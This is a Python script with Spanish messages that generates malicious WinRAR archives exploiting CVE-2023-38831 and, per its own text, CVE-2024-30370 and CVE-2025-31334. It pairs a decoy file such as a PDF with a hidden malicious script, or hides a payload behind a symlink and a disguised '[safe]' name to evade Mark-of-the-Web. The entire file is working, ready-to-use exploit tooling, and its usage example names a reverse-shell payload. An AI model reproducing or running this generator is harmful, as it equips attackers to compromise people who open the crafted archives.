# main.py
import os
import shutil
import string
import random
import tempfile
import subprocess
import argparse
from typing import Callable

_empty_log = lambda *a, **kw: None

def random_str(length=10):
    return ''.join(random.choices(string.ascii_letters, k=length))


def ensure_file_exists(path):
    if not os.path.isfile(path):
        raise FileNotFoundError(f"Archivo no encontrado: {path}")
    return os.path.abspath(path)

def prepare_temp_dir(prefix="tmp_exploit_"):
    temp_dir = tempfile.mkdtemp(prefix=prefix)
    return temp_dir

def cleanup(path):
    if os.path.exists(path):
        shutil.rmtree(path, ignore_errors=True)
        print(f"[*] Limpieza: {path}")


def exploit_38831(bait, switch, output, verbose=_empty_log):
    temp_dir = prepare_temp_dir("rarce_")
    bait_name = os.path.basename(bait)
    ext = os.path.splitext(switch)[1].lstrip(".")

    bait_ph = random_str(len(bait_name) + 1)
    path_ph = random_str(len(bait_name) + 1)
    switch_ph = random_str(len(bait_name) + len(ext) + 2)

    nested = os.path.join(temp_dir, path_ph)
    os.mkdir(nested)
    shutil.copyfile(bait, os.path.join(temp_dir, bait_ph))
    shutil.copyfile(switch, os.path.join(nested, switch_ph))

    archive_path = f"{temp_dir}.zip"
    shutil.make_archive(temp_dir, 'zip', temp_dir)

    with open(archive_path, "rb") as f:
        data = f.read()
    data = data.replace(bait_ph.encode(), bait_name.encode() + b" ")
    data = data.replace(switch_ph.encode(), bait_name.encode() + b" ." + ext.encode())
    data = data.replace(path_ph.encode(), bait_name.encode() + b" ")

    with open(output, "wb") as out:
        out.write(data)

    os.remove(archive_path)
    cleanup(temp_dir)
    print(f"[✅] Exploit CVE-2023-38831 creado: {output}")

def check_rar_cli():
    try:
        result = subprocess.run(["rar"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, timeout=10)
        return "WinRAR" in result.stdout.decode(errors="ignore") + result.stderr.decode(errors="ignore")
    except Exception:
        return False

def exploit_dual(payload, output, alt_name="payload [safe].exe", symlink_name="runme_link.exe"):

    if not check_rar_cli():
        print("[!] WinRAR CLI (rar.exe) no está disponible en PATH.")
        return False

    temp_dir = prepare_temp_dir("dual_")
    payload_path = os.path.abspath(payload)

    alt_path = os.path.join(temp_dir, alt_name)
    shutil.copy(payload_path, alt_path)

    symlink_path = os.path.join(temp_dir, symlink_name)
    try:
        os.symlink(payload_path, symlink_path)
    except Exception as e:
        print(f"[!] No se pudo crear el symlink: {e}")
        print("💡 Ejecuta como Administrador o activa Developer Mode.")
        cleanup(temp_dir)
        return False

    cmd = f'rar a -ep1 "{output}" "{alt_path}" "{symlink_path}"'
    try:
        result = subprocess.run(cmd, shell=True, check=True, capture_output=True, text=True, timeout=30)
        cleanup(temp_dir)
        print(f"[✅] Exploit dual CVE-2024-30370 & CVE-2025-31334 creado: {output}")
        print("📌 Verifica MotW con PowerShell:\n" +
              f"  Get-Item .\\\"{alt_name}\" -Stream *\n" +
              f"  Get-Item .\\\"{symlink_name}\" -Stream *")
        return True
    except subprocess.CalledProcessError as e:
        print(f"[!] Error ejecutando rar: {e}")
        print(f"STDOUT: {e.stdout}")
        print(f"STDERR: {e.stderr}")
        cleanup(temp_dir)
        return False
    except Exception as e:
        print(f"[!] Error inesperado: {e}")
        cleanup(temp_dir)
        return False

def create_dummy_payload(payload_name="payload.exe"):
    """Create a dummy payload for testing"""
    if not os.path.exists(payload_name):
        with open(payload_name, "wb") as f:
            f.write(b"MZ" + b"\x00" * 100)  # Minimal PE header
        print(f"[+] Payload simulado generado: {payload_name}")
    return payload_name

# ---------------- MAIN ----------------
def main():
    parser = argparse.ArgumentParser(
        description="Generador combinado de exploits para CVE-2023-38831, CVE-2024-30370 y CVE-2025-31334.",
        epilog="Ejemplo: python main.py --bait document.pdf --switch exploit.cmd --payload reverse_shell.exe"
    )
    
    parser.add_argument("--bait", help="Archivo señuelo (e.g. document.pdf)")
    parser.add_argument("--switch", help="Script malicioso (e.g. reverse_shell.cmd)")
    parser.add_argument("--payload", default="payload.exe", help="Nombre de payload (por defecto: payload.exe)")
    parser.add_argument("--output-38831", default="exploit_38831.rar", help="Nombre del archivo CVE-2023-38831 (por defecto: exploit_38831.rar)")
    parser.add_argument("--output-dual", default="exploit_dual.rar", help="Nombre del archivo dual exploit (por defecto: exploit_dual.rar)")
    parser.add_argument("--alt-name", default="payload [safe].exe", help="Nombre alternativo para el payload (por defecto: payload [safe].exe)")
    parser.add_argument("--symlink-name", default="runme_link.exe", help="Nombre del symlink (por defecto: runme_link.exe)")
    parser.add_argument("--only-38831", action="store_true", help="Solo generar exploit CVE-2023-38831")
    parser.add_argument("--only-dual", action="store_true", help="Solo generar exploit dual")
    
    args = parser.parse_args()


    generate_38831 = not args.only_dual
    generate_dual = not args.only_38831

    try:
        success = True
        
        if generate_38831:
            if not args.bait or not args.switch:
                print("[!] Para CVE-2023-38831 se requieren --bait y --switch")
                return
                
            bait = ensure_file_exists(args.bait)
            switch = ensure_file_exists(args.switch)
            exploit_38831(bait, switch, args.output_38831)
        
        if generate_dual:
     
            payload = args.payload
            if not os.path.exists(payload):
                payload = create_dummy_payload(payload)
            else:
                payload = ensure_file_exists(payload)
                
            result = exploit_dual(payload, args.output_dual, args.alt_name, args.symlink_name)
            if not result:
                success = False
        
        if success:
            print("\n[🎉] ¡Todos los exploits se generaron exitosamente!")
            if generate_38831:
                print(f"   CVE-2023-38831: {args.output_38831}")
            if generate_dual:
                print(f"   CVE-Dual: {args.output_dual}")
        else:
            print("\n[⚠️] Algunos exploits no se pudieron generar.")
            
    except Exception as e:
        print(f"[!] Error: {e}")
        import traceback
        traceback.print_exc()

if __name__ == "__main__":
    main()
